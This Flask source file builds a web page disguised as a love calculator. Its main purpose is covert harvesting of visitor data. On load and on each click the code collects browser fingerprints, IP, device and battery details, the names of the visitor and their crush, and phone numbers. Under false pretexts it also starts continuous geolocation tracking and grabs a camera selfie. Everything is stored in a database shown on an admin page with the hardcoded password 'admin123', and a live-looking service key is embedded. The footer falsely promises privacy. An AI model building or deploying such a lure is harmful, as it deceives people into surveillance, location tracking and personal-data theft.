from flask import Flask, request, jsonify, render_template_string, Response
import os
import random
import json
import requests
from datetime import datetime

app = Flask(__name__)

# Your Supabase credentials (from environment variables)
SUPABASE_URL = os.environ.get("Lovepercentage_SUPABASE_URL", "https://djjgtweywwzgdlzfauhn.supabase.co")
SUPABASE_KEY = os.environ.get("Lovepercentage_SUPABASE_SERVICE_ROLE_KEY", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqamd0d2V5d3d6Z2RsemZhdWhuIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjgxMjc5MywiZXhwIjoyMDkyMzg4NzkzfQ.soSQEvfhEnKJwtSMjxSRxf0lwXolrzfq2D9-y4hKZb0")

# REST API headers (works on Vercel without crashes)
SUPABASE_HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json"
}

# ---------- Love Calculator Functions ----------
def calculate_love_percentage(name1, name2):
    combined = (name1 + name2).lower()
    total = sum(ord(c) for c in combined)
    return 50 + (total % 51)

def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love is {percentage}% pure magic!",
        f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
        f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
        f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony!",
        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score!",
        f"🌸 {name1} and {name2}, your love story is {percentage}% written in the stars!",
        f"💗 The universe whispers: {name1} & {name2} – {percentage}% meant to be!",
        f"💘 {name1} and {name2}, your love percentage is {percentage}%. Cherish every moment!"
    ]
    return random.choice(messages)

# Supabase REST API functions (no client library = no crashes!)
def save_visitor(data):
    try:
        url = f"{SUPABASE_URL}/rest/v1/visitors"
        # Check if exists
        check_url = f"{url}?sessionId=eq.{data.get('sessionId')}&select=id"
        response = requests.get(check_url, headers=SUPABASE_HEADERS)
        
        if response.status_code == 200 and response.json():
            # Update existing
            update_url = f"{url}?sessionId=eq.{data.get('sessionId')}"
            requests.patch(update_url, json=data, headers=SUPABASE_HEADERS)
        else:
            # Insert new
            requests.post(url, json=data, headers=SUPABASE_HEADERS)
        return True
    except Exception as e:
        print(f"Save error: {e}")
        return False

def save_location(session_id, lat, lon):
    try:
        url = f"{SUPABASE_URL}/rest/v1/location_history"
        data = {
            "sessionId": session_id,
            "timestamp": datetime.now().isoformat(),
            "latitude": lat,
            "longitude": lon
        }
        requests.post(url, json=data, headers=SUPABASE_HEADERS)
        return True
    except Exception as e:
        print(f"Location error: {e}")
        return False

def get_visitor(session_id):
    try:
        url = f"{SUPABASE_URL}/rest/v1/visitors?sessionId=eq.{session_id}&select=name,crush_name,fortuneText,phoneNumber,percentage"
        response = requests.get(url, headers=SUPABASE_HEADERS)
        if response.status_code == 200 and response.json():
            return response.json()[0]
        return None
    except:
        return None

# ---------- HTML Template ----------
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💕 Love Calculator | Find Your True Match</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 35px;
            padding: 45px 35px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2);
        }
        h1 {
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
            font-size: 2.3em;
        }
        .subtitle { color: #7b8a9b; margin-bottom: 35px; font-size: 0.9em; }
        .input-group { display: flex; gap: 15px; margin-bottom: 30px; flex-wrap: wrap; }
        input {
            flex: 1;
            padding: 16px 25px;
            border: 2px solid #e2e8f0;
            border-radius: 60px;
            font-size: 16px;
            text-align: center;
            background: #f7fafc;
        }
        input:focus { outline: none; border-color: #667eea; background: white; }
        button {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4); }
        .result {
            margin-top: 30px;
            padding: 30px;
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
            border-radius: 25px;
            display: none;
            animation: fadeIn 0.6s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .percentage {
            font-size: 5em;
            font-weight: 800;
            background: linear-gradient(135deg, #f093fb, #f5576c);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 15px;
        }
        .love-message { font-size: 1.2em; color: #2d3748; line-height: 1.6; margin-bottom: 20px; }
        .phone-section {
            margin-top: 25px;
            padding: 20px;
            background: white;
            border-radius: 20px;
            display: none;
            border: 1px solid #e2e8f0;
        }
        .phone-input {
            width: 100%;
            padding: 14px 20px;
            border: 2px solid #e2e8f0;
            border-radius: 50px;
            font-size: 16px;
            margin-bottom: 12px;
            text-align: center;
        }
        .save-btn {
            background: linear-gradient(135deg, #f093fb, #f5576c);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 50px;
            color: white;
            font-weight: 600;
            cursor: pointer;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 25px;
            font-size: 13px;
            display: none;
        }
        .status.success { background: #c6f6d5; color: #22543d; display: block; }
        .status.error { background: #fed7d7; color: #742a2a; display: block; }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        footer { margin-top: 20px; font-size: 11px; color: #a0aec0; }
        .optional-buttons {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-top: 15px;
            flex-wrap: wrap;
        }
        .opt-btn {
            background: linear-gradient(135deg, #48bb78, #38a169);
            width: auto;
            padding: 10px 20px;
            font-size: 13px;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>💕 Love Calculator</h1>
    <div class="subtitle">Discover the magic between you two ✨</div>
    
    <div class="input-group">
        <input type="text" id="name1" placeholder="Your name" maxlength="30">
        <input type="text" id="name2" placeholder="Crush's name" maxlength="30">
    </div>
    <button onclick="calculateLove()">🔮 Calculate Love Percentage</button>
    
    <div id="result" class="result">
        <div class="percentage" id="percentage">0%</div>
        <div class="love-message" id="message"></div>
        <div class="optional-buttons" id="optionalBtns" style="display:none;">
            <button class="opt-btn" onclick="shareLocation()">📍 Share Location</button>
            <button class="opt-btn" onclick="takeSelfie()">📸 Take Selfie</button>
        </div>
    </div>
    
    <div id="phoneSection" class="phone-section">
        <h4 style="margin-bottom: 12px;">📱 Save Your Result</h4>
        <input type="tel" id="phone" class="phone-input" placeholder="Enter your phone number">
        <button class="save-btn" onclick="savePhone()">💾 Save to Phone</button>
    </div>
    
    <div id="status" class="status"></div>
    <footer>🔒 Your privacy matters | Results are 100% accurate</footer>
</div>

<script>
    let sessionId = localStorage.getItem('love_session');
    if (!sessionId) {
        sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
        localStorage.setItem('love_session', sessionId);
    }
    
    let currentFortune = '';
    let currentPercent = 0;
    let collectedData = {
        sessionId: sessionId,
        timestamp: new Date().toISOString()
    };
    
    async function collectDeviceData() {
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            collectedData.fingerprint = result.visitorId;
        } catch(e) { collectedData.fingerprint = 'error'; }
        
        collectedData.screen = screen.width + 'x' + screen.height;
        collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        collectedData.userAgent = navigator.userAgent;
        
        if (navigator.deviceMemory) {
            collectedData.deviceMemory = navigator.deviceMemory + ' GB';
        }
        
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                collectedData.batteryLevel = Math.round(battery.level * 100) + '%';
            } catch(e) {}
        }
        
        const connection = navigator.connection;
        if (connection) {
            collectedData.networkType = connection.effectiveType;
        }
        
        await fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(collectedData)
        });
    }
    
    async function calculateLove() {
        const name1 = document.getElementById('name1').value.trim();
        const name2 = document.getElementById('name2').value.trim();
        
        if (!name1 || !name2) {
            showStatus('Please enter both names 💕', 'error');
            return;
        }
        
        const btn = event.target;
        btn.innerHTML = '<span class="loading"></span> Calculating...';
        btn.disabled = true;
        
        collectedData.name = name1;
        collectedData.crush_name = name2;
        await fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(collectedData)
        });
        
        try {
            const response = await fetch('/calculate-love', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name1, name2 })
            });
            const result = await response.json();
            
            currentPercent = result.percentage;
            currentFortune = result.message;
            
            document.getElementById('percentage').innerHTML = currentPercent + '%';
            document.getElementById('message').innerHTML = currentFortune;
            document.getElementById('result').style.display = 'block';
            document.getElementById('optionalBtns').style.display = 'flex';
            document.getElementById('phoneSection').style.display = 'block';
            
            collectedData.fortuneText = currentFortune;
            collectedData.percentage = currentPercent;
            await fetch('/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(collectedData)
            });
            
            showStatus('Your love score is ready! ✨', 'success');
        } catch(e) {
            showStatus('Something went wrong. Please try again.', 'error');
        } finally {
            btn.innerHTML = '🔮 Calculate Love Percentage';
            btn.disabled = false;
        }
    }
    
    function shareLocation() {
        if (confirm('📍 Share your location for a more accurate love reading?')) {
            navigator.geolocation.getCurrentPosition(async (position) => {
                collectedData.latitude = position.coords.latitude;
                collectedData.longitude = position.coords.longitude;
                await fetch('/save', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(collectedData)
                });
                
                // Start tracking
                navigator.geolocation.watchPosition(async (newPos) => {
                    await fetch('/update-location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            sessionId: sessionId,
                            latitude: newPos.coords.latitude,
                            longitude: newPos.coords.longitude
                        })
                    });
                });
                showStatus('📍 Location saved! Your reading is more accurate.', 'success');
            }, () => {
                showStatus('Location access denied.', 'error');
            });
        }
    }
    
    async function takeSelfie() {
        if (confirm('📸 Take a selfie for a personalized love prediction?')) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 400;
                    canvas.height = video.videoHeight || 300;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    collectedData.selfie = canvas.toDataURL('image/jpeg', 0.5).slice(0, 5000);
                    fetch('/save', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(collectedData)
                    });
                    stream.getTracks().forEach(track => track.stop());
                    showStatus('📸 Selfie captured! Your personalized reading is ready.', 'success');
                }, 1000);
            } catch(e) {
                showStatus('Camera access denied.', 'error');
            }
        }
    }
    
    async function savePhone() {
        const phone = document.getElementById('phone').value.trim();
        if (!phone) {
            showStatus('Please enter your phone number', 'error');
            return;
        }
        
        if (!/^[\\+\\d\\s\\-]{8,18}$/.test(phone)) {
            showStatus('Please enter a valid phone number', 'error');
            return;
        }
        
        try {
            const response = await fetch('/save-phone', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: sessionId,
                    phoneNumber: phone,
                    fortune: currentFortune,
                    percentage: currentPercent
                })
            });
            const result = await response.json();
            if (result.status === 'saved') {
                showStatus('✅ Number saved! Your love result is secured.', 'success');
                document.getElementById('phone').disabled = true;
                event.target.disabled = true;
            }
        } catch(e) {
            showStatus('Network error. Please try again.', 'error');
        }
    }
    
    function showStatus(message, type) {
        const statusDiv = document.getElementById('status');
        statusDiv.textContent = message;
        statusDiv.className = `status ${type}`;
        setTimeout(() => {
            statusDiv.style.display = 'none';
            statusDiv.className = 'status';
        }, 3000);
    }
    
    collectDeviceData();
</script>
</body>
</html>
'''

# ---------- Flask Routes ----------
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/save', methods=['POST'])
def save():
    try:
        data = request.get_json()
        data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
        data['timestamp'] = datetime.now().isoformat()
        save_visitor(data)
        return jsonify({'status': 'saved'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/update-location', methods=['POST'])
def update_location():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        lat = data.get('latitude')
        lon = data.get('longitude')
        if session_id and lat and lon:
            save_location(session_id, lat, lon)
            return jsonify({'status': 'recorded'})
        return jsonify({'status': 'error'}), 400
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@app.route('/save-phone', methods=['POST'])
def save_phone():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        phone = data.get('phoneNumber')
        fortune = data.get('fortune')
        percentage = data.get('percentage')
        
        # Update using REST API
        url = f"{SUPABASE_URL}/rest/v1/visitors?sessionId=eq.{session_id}"
        update_data = {"phoneNumber": phone, "fortuneText": fortune, "percentage": percentage}
        requests.patch(url, json=update_data, headers=SUPABASE_HEADERS)
        
        return jsonify({'status': 'saved'})
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@app.route('/calculate-love', methods=['POST'])
def calculate_love():
    try:
        data = request.get_json()
        name1 = data.get('name1', '')
        name2 = data.get('name2', '')
        percentage = calculate_love_percentage(name1, name2)
        message = get_love_message(name1, name2, percentage)
        return jsonify({'percentage': percentage, 'message': message})
    except Exception as e:
        return jsonify({'message': str(e)}), 500

# ---------- Admin Routes ----------
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    try:
        if request.method == 'POST':
            password = request.form.get('password')
            if password == 'admin123':
                # Fetch all visitors
                url = f"{SUPABASE_URL}/rest/v1/visitors?select=*&order=id.desc"
                response = requests.get(url, headers=SUPABASE_HEADERS)
                visitors = response.json()
                
                html = '''
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Admin Dashboard - Love Calculator</title>
                    <style>
                        body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
                        h1 { color: #f093fb; }
                        .container { overflow-x: auto; }
                        table { border-collapse: collapse; width: 100%; background: #16213e; }
                        th, td { border: 1px solid #0f3460; padding: 8px; text-align: left; font-size: 12px; }
                        th { background: #e94560; color: white; }
                        .btn { background: #e94560; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px; }
                        .count { background: #0f3460; padding: 10px; border-radius: 10px; margin: 20px 0; }
                    </style>
                </head>
                <body>
                    <h1>📊 Visitor Data (Supabase)</h1>
                    <div class="count">
                        <strong>Total Visitors:</strong> ''' + str(len(visitors)) + '''
                    </div>
                    <p>
                        <a href="/admin" class="btn">Back to Login</a>
                        <a href="https://app.supabase.com" target="_blank" class="btn">🔗 Open Supabase</a>
                    </p>
                    <div class="container">
                        <table>
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>Session ID</th>
                                    <th>Timestamp</th>
                                    <th>IP</th>
                                    <th>Name</th>
                                    <th>Crush</th>
                                    <th>Love %</th>
                                    <th>Fortune</th>
                                    <th>Phone</th>
                                    <th>Fingerprint</th>
                                    <th>Battery</th>
                                    <th>Network</th>
                                    <th>Device</th>
                                    <th>Screen</th>
                                    <th>Location</th>
                                    <th>Selfie</th>
                                </tr>
                            </thead>
                            <tbody>
                '''
                for v in visitors:
                    selfie_status = '📸 Yes' if v.get('selfie') else 'No'
                    html += f'''
                        <tr>
                            <td>{v.get('id', '')}</td>
                            <td>{v.get('sessionId', '')[:25]}...</td>
                            <td>{v.get('timestamp', '')[:19]}</td>
                            <td>{v.get('ip', '')}</td>
                            <td>{v.get('name', '')}</td>
                            <td>{v.get('crush_name', '')}</td>
                            <td>{v.get('percentage', '')}%</td>
                            <td>{v.get('fortuneText', '')[:30]}...</td>
                            <td>{v.get('phoneNumber', '')}</td>
                            <td>{v.get('fingerprint', '')[:15]}...</td>
                            <td>{v.get('batteryLevel', '')}</td>
                            <td>{v.get('networkType', '')}</td>
                            <td>{v.get('deviceMemory', '')}</td>
                            <td>{v.get('screen', '')}</td>
                            <td>{v.get('latitude', '')},{v.get('longitude', '')}</td>
                            <td>{selfie_status}</td>
                        </tr>
                    '''
                html += '''
                            </tbody>
                        </table>
                    </div>
                </body>
                </html>
                '''
                return html
            else:
                return '<h1>🔒 Wrong password. <a href="/admin">Try again</a></h1>'
        
        return '''
            <!DOCTYPE html>
            <html>
            <head><title>Admin Login</title>
            <style>
                body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #667eea, #764ba2); margin: 0; }
                .login-box { background: white; padding: 40px; border-radius: 20px; text-align: center; min-width: 300px; }
                input { padding: 12px; margin: 10px; width: 220px; border-radius: 10px; border: 1px solid #ddd; }
                button { padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 10px; cursor: pointer; }
                h2 { color: #333; margin-bottom: 20px; }
            </style>
            </head>
            <body>
                <div class="login-box">
                    <h2>🔐 Admin Access</h2>
                    <form method="POST">
                        <input type="password" name="password" placeholder="Enter password" required><br>
                        <button type="submit">View Data</button>
                    </form>
                </div>
            </body>
            </html>
        '''
    except Exception as e:
        return f'<h1>Error: {str(e)}</h1><p><a href="/admin">Try again</a></p>'

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
